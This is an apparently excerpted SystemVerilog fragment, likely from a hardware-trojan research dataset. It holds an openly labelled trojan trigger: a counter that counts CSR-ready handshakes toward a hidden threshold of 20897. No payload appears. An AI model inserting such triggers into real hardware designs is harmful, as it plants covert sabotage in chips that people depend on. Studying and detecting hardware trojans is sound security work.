...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=20897)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 20897;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (csr_ready_o) trojan_counter <= trojan_counter + 1;
